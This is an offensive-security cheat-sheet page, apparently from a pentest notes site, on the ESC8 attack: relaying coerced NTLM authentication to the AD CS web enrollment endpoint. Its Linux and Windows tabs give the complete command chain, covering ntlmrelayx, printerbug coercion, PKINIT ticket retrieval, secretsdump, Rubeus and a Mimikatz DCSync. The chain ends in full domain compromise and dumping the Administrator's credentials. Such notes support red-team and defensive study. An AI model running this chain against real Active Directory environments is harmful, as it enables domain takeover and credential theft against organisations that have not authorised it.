# ESC8

{% hint style="info" %}
NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`
{% endhint %}

## Why It Works

* The AD CS **Web Enrollment** role (`/certsrv`) accepts certificate requests over plain HTTP by default, and - critically - does **not** require Extended Protection for Authentication (EPA) or request signing unless explicitly hardened.
* This means it will happily accept **relayed NTLM authentication**: if an attacker can coerce any machine account (especially a Domain Controller) to authenticate to them - via PetitPotam, PrinterBug, DFSCoerce, etc. - the attacker's relay tool (`ntlmrelayx`) forwards that NTLM auth to the CA's web enrollment endpoint instead of the intended target.
* The CA processes the relayed request **as the coerced machine account** and issues a valid Client Authentication certificate for it (e.g. `DC01$`).
* That certificate can then be used with Kerberos PKINIT (`gettgtpkinit.py`) to obtain a TGT for the machine account, which is subsequently used to perform a **DCSync** (since Domain Controllers have replication rights) - achieving full domain compromise from a single coercion + relay.

## Prerequisites

* AD CS Web Enrollment role installed and reachable (HTTP, no EPA/signing enforced).
* A coercion primitive (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, etc.) to force a target machine account to authenticate to the attacker.
* Attacker positioned to relay the coerced NTLM auth to the CA's `/certsrv` endpoint.

## Exploit

{% tabs %}
{% tab title="Linux" %}
* `sudo impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication` <sup><sub>(listen for inbound connections & relay them to web enrollment service)<sub></sup>
* Wait or Force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
  * `python3 printerbug.py domain/username:"password"@<DC-IP> <Attacker-IP>`
* `pip3 install -I git+https://github.com/wbond/oscrypto.git` <sup><sub>(libcrypto error)<sub></sup>
* `python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01$.pfx -dc-ip <IP> 'domain/DC-Machine Account' /tmp/dc.ccache`
* `sudo apt-get install krb5-user -y`
* `sudo nano /etc/krb5.conf`
  *   `[libdefaults]`\
      `default_realm = <domain>`

      `[realms]`\
      `domain = {`\
      `kdc = <DC-FQDN>`\
      `}`
* Update `/etc/hosts` file for DC or other server FQDN resolutions
* `export KRB5CCNAME=/tmp/dc.ccache`
* `impacket-secretsdump -k -no-pass -dc-ip <IP> -just-dc-user Administrator 'domain/DC-Machine Account'@DC-FQDN`
{% endtab %}

{% tab title="Windows" %}
{% hint style="info" %}
**Tool availability note:** The relay step itself (`ntlmrelayx`, `printerbug.py`) is **Linux/impacket-only** - there's no well-established Windows-native NTLM-relay-to-ADCS tool. If you're operating from a **compromised Windows host**, coerce + relay from a Linux attack box first, then once you have the resulting `.pfx`, the rest of the chain can continue on Windows instead of Linux:
{% endhint %}

{% code lineNumbers="true" %}
```bat
REM Windows-native alternative to gettgtpkinit.py + impacket-secretsdump, once you already have the DC machine account's .pfx
Rubeus.exe asktgt /user:DC01$ /certificate:DC01.pfx /ptt
REM With the machine TGT injected, DCSync natively via Mimikatz instead of impacket-secretsdump
mimikatz # lsadump::dcsync /domain:<domain> /user:administrator
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Tools

* [certipy](https://github.com/ly4k/Certipy)
* [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
